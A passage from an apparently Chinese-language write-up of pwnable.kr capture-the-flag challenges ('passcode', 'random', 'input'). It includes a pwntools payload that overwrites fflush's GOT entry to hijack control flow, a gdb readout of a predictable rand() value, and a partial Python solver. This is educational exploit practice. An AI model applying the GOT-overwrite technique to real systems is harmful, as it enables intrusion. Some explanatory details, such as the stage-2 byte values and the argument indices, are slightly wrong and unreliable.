</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;enter you name :&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%100s&#34;</span><span class=p>,</span> <span class=n>name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Welcome %s!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>name</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Toddler&#39;s Secure Login System 1.0 beta.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>welcome</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>login</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// something after login...
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Now I can safely trust you that you have credential :)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>直接输入 passcode 的话会显示段错误，显然是因为两个 <code>scanf</code> 都没有在变量前加 <code>&</code>，直接往变量值所代表的地址上写了。</p><p>换句话说，我们可以输入适当的 <code>passcode</code> 来控制两个局部变量的地址，使得他们等于那两个数值。而存储那两个数值的地址，只能来自于我们输入的 <code>name</code>。</p><p>然而这两个数值代表的地址未必可写，<code>name</code> 和两个 <code>passcode</code> 也位于不同栈帧，无法缓冲区溢出来覆盖。到这一步似乎卡住了。但经过反汇编发现 <code>name</code> 在 <code>ebp-0x70</code>，<code>passcode1</code> 在 <code>ebp-0x10</code>，两者相差 96 字节且位于同一栈帧，换句话说 <code>name</code> 是可以覆盖 <code>passcode1</code> 的，这样看似乎又有希望。</p><p>注意到 <code>login</code> 中，<code>scanf</code> 第一次后调用了 <code>fflush</code>。因此我们可以考虑利用 <code>scanf</code> 的写特性写 GOT 表，因为 GOT 表肯定是可写的。那么我们可以先用 <code>fflush</code> 的 GOT 地址（不止 <code>fflush</code>，程序中包含的 GLIBC 函数都行）覆盖 <code>passcode1</code> 的值，然后通过 <code>scanf</code> 对 <code>passcode1</code> 的<strong>值所代表的地址</strong>（也就是 <code>fflush</code> 的 GOT）写入 <code>system("/bin/cat flag")</code> 的地址。这样相当于将 <code>fflush</code> 函数劫持到了 <code>system("/bin/cat flag")</code> 上。</p><p><code>objdump -R passcode</code> 导出程序动态重定向表，拿到 <code>fflush</code> 的 GOT 地址 <code>0804a004</code>；然后 gdb 里 <code>disas login</code> 拿到 <code>system("/bin/cat flag")</code> 的地址 <code>080485e3</code>，<strong>注意</strong>这个地址实际上是 <code>call system</code> 的前一句：<code>movl $0x80487af,(%esp)</code>，也就是准备 <code>system</code> 函数的参数的语句。最后发 payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ python
</span></span><span class=line><span class=cl>&gt;&gt;&gt; from pwn import *
</span></span><span class=line><span class=cl>&gt;&gt;&gt; context.log_level <span class=o>=</span> <span class=s1>&#39;DEBUG&#39;</span>
</span></span><span class=line><span class=cl>&gt;&gt;&gt; <span class=nv>p</span> <span class=o>=</span> process<span class=o>(</span><span class=s1>&#39;./passcode&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>&gt;&gt;&gt; p.sendline<span class=o>(</span><span class=s1>&#39;a&#39;</span>*96+p32<span class=o>(</span>0x0804a004<span class=o>))</span>
</span></span><span class=line><span class=cl>&gt;&gt;&gt; p.sendline<span class=o>(</span>str<span class=o>(</span>0x080485e3<span class=o>))</span>
</span></span><span class=line><span class=cl>&gt;&gt;&gt; p.interactive<span class=o>()</span>
</span></span></code></pre></td></tr></table></div></div><p>需要注意的是，<code>scanf</code> 的时候接收 <code>%d</code>，因此需要 <code>str</code> 一下转成十进制字符串。</p><blockquote><p>注：</p><ol><li>GLIBC 函数的 GOT 地址，在 pwntools 中可以用类似 <code>elf.got['fflush']</code> 的方法获得，更加方便</li><li>如果开启了 PIE 则需要 leak 出 GOT 地址。</li></ol></blockquote><h2 id=random>random</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>random</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>random</span> <span class=o>=</span> <span class=n>rand</span><span class=p>();</span>        <span class=c1>// random value!
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>key</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>((</span><span class=n>key</span> <span class=o>^</span> <span class=n>random</span><span class=p>)</span> <span class=o>==</span> <span class=mh>0xdeadbeef</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Good!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Wrong, maybe you should try 2^32 cases.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>我们都知道 C 的 <code>rand</code> 函数是伪随机，随机性取决于 <code>srand</code> 函数设定的种子，这个种子默认为 <code>1</code>。因此 <code>random</code> 变量实际上是固定的，只要在栈上把他读出来即可。</p><p><code>random</code> 是函数的局部变量，并且是 <code>unsigned int</code>，因此应该在 <code>ebp-4 的位置 </code>。我们在有 <code>deadbeef</code> 的那行下断点，随便输入后，在 gdb 中输入 <code>x/8x $rbp-4</code>，即可读取到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0x7ffefe6d5d0c: 0x6b8b4567      0x00400670      0x00000000      0x4439d830
</span></span><span class=line><span class=cl>0x7ffefe6d5d1c: 0x00007f68      0x00000001      0x00000000      0xfe6d5df8
</span></span></code></pre></td></tr></table></div></div><p>也就是说，<code>0x6b8b4567</code> 就是这个 <code>random</code>，我们由此可以算出 <code>key</code> 为 <code>3039230856</code>。</p><h2 id=input>input</h2><p>非常好玩的一题，涵盖了 Linux 下各种基本的通信方式。</p><p>先说一下这题的坑点：<code>/home/input</code> 下我们没有写权限，而 <code>/tmp</code> 目录下有写权限没有读权限，所以比较好的方法是在 <code>/tmp</code> 下新建个目录，把 flag 软链接（<code>ln -s /home/input2/flag ./flag</code>）到这个目录里，脚本放在同一目录下运行。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/socket.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;arpa/inet.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[],</span> <span class=kt>char</span><span class=o>*</span> <span class=n>envp</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Welcome to pwnable.kr</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Let&#39;s see if you know how to give input to program</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Just give me correct inputs then you will get the flag :)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// argv
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span><span class=p>(</span><span class=n>argc</span> <span class=o>!=</span> <span class=mi>100</span><span class=p>)</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=n>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=sc>&#39;A&#39;</span><span class=p>],</span><span class=s>&#34;</span><span class=se>\x00</span><span class=s>&#34;</span><span class=p>))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=n>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=sc>&#39;B&#39;</span><span class=p>],</span><span class=s>&#34;</span><span class=se>\x20\x0a\x0d</span><span class=s>&#34;</span><span class=p>))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Stage 1 clear!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// stdio
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=n>memcmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\x00\x0a\x00\xff</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>4</span><span class=p>))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>read</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>memcmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\x00\x0a\x02\xff</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>4</span><span class=p>))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Stage 2 clear!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// env
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span><span class=p>(</span><span class=n>strcmp</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\xca\xfe\xba\xbe</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>getenv</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\xde\xad\xbe\xef</span><span class=s>&#34;</span><span class=p>)))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Stage 3 clear!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// file
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>FILE</span><span class=o>*</span> <span class=n>fp</span> <span class=o>=</span> <span class=n>fopen</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\x0a</span><span class=s>&#34;</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=n>fp</span><span class=p>)</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=n>fread</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>fp</span><span class=p>)</span><span class=o>!=</span><span class=mi>1</span> <span class=p>)</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=n>memcmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\x00\x00\x00\x00</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span> <span class=p>)</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>fclose</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Stage 4 clear!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// network
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>int</span> <span class=n>sd</span><span class=p>,</span> <span class=n>cd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>sockaddr_in</span> <span class=n>saddr</span><span class=p>,</span> <span class=n>caddr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>sd</span> <span class=o>=</span> <span class=n>socket</span><span class=p>(</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>SOCK_STREAM</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=n>sd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;socket error, tell admin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=n>saddr</span><span class=p>.</span><span class=n>sin_family</span> <span class=o>=</span> <span class=n>AF_INET</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>saddr</span><span class=p>.</span><span class=n>sin_addr</span><span class=p>.</span><span class=n>s_addr</span> <span class=o>=</span> <span class=n>INADDR_ANY</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>saddr</span><span class=p>.</span><span class=n>sin_port</span> <span class=o>=</span> <span class=n>htons</span><span class=p>(</span><span class=n>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=sc>&#39;C&#39;</span><span class=p>])</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=n>bind</span><span class=p>(</span><span class=n>sd</span><span class=p>,</span> <span class=p>(</span><span class=k>struct</span> <span class=n>sockaddr</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>saddr</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>saddr</span><span class=p>))</span> <span class=o>&lt;</span><span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;bind error, use another port</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    		<span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=n>listen</span><span class=p>(</span><span class=n>sd</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>c</span> <span class=o>=</span> <span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span> <span class=n>sockaddr_in</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>cd</span> <span class=o>=</span> <span class=n>accept</span><span class=p>(</span><span class=n>sd</span><span class=p>,</span> <span class=p>(</span><span class=k>struct</span> <span class=n>sockaddr</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>caddr</span><span class=p>,</span> <span class=p>(</span><span class=n>socklen_t</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=n>cd</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=n>printf</span><span class=p>(</span><span class=s>&#34;accept error, tell admin</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=n>recv</span><span class=p>(</span><span class=n>cd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>4</span> <span class=p>)</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=n>memcmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\xde\xad\xbe\xef</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>4</span><span class=p>))</span> <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Stage 5 clear!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// here&#39;s your flag
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/cat flag&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到一共有 5 关：</p><ul><li>第一关要求有 100 个命令行参数，其中第 64 个是 <code>\x00</code>，第 65 个是 <code>\x20\x0a\x0d</code>；</li><li>第二关分别从标准输入和标准错误流中读取，要求读到的信息分别是 <code>\x00\x0a\x00\xff</code> 和 <code>\x00\x0a\x00\xff</code>，由于我们无法控制标准错误流，可以采用管道重定向的方式；</li><li>第三关需要我们设置环境变量 <code>\xde\xad\xbe\xef=\xca\xfe\xba\xbe</code>；</li><li>第四关读取一个文件，要求前四个字节是 <code>\x00\x00\x00\x00</code>；</li><li>第五关建立了一个 socket，监听的端口来自第 66 个命令行参数，且期望收到的消息是 <code>\xde\xad\xbe\xef</code>。</li></ul><p>编写 python 脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># stage 1</span>
</span></span><span class=line><span class=cl><span class=n>args</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;/home/input2/input&#34;</span>
</span></span><span class=line><span class=cl><span class=n>args</span><span class=p>[</span><span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;A&#39;</span><span class=p>)]</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>args</span><span class=p>[</span><span class=nb>ord</span><span class=p>(</span><span class=s1>&#39;B&#39;</span><span class=p>)]</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\x20\x0a\x0d</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=n>args</span><span class=p>[</span><span class=nb>ord</span><span class=p>(</span><span class=s2>&#34;C&#34;</span><span class=p>)]</span> <span class=o>=</span> <span class=s2>&#34;8080&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># stage 2</span>
</span></span><span class=line><span class=cl><span class=n>stdin_r</span><span class=p>,</span> <span class=n>stdin_w</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>pipe</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>stderr_r</span><span class=p>,</span> <span class=n>stderr_w</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>pipe</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>stdin_w</span><span class=p>,</span><span class=s2>&#34;</span><span class=se>\x00\x0a\x00\xff</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>stderr_w</span><span class=p>,</span><span class=s2>&#34;</span><span class=se>\x00\x0a\x02\xff</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># stage 3</span>
</span></span><span class=line><span class=cl><span class=n>env</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;</span><span class=se>\xde\xad\xbe\xef</span><span class=s2>&#34;</span><span class=p>:</span> <span class=s2>&#34;</span><span class=se>\xca\xfe\xba\xbe</span><span class=s2>&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># stage 4</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x0a</span><span class=s2>&#34;</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=o>*</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># open a subprocess here because we need a server</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>args</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=n>stdin_r</span><span class=p>,</span><span class=n>stderr</span><span class=o>=</span><span class=n>stderr_r</span><span class=p>,</span><span class=n>env</span><span class=o>=</span><span class=n>env</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># stage 5</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=c1># wait 4 server</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=mi>8080</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\xde\xad\xbe\xef</span><span class=s2>&#34;</span><span class=p>)</span>
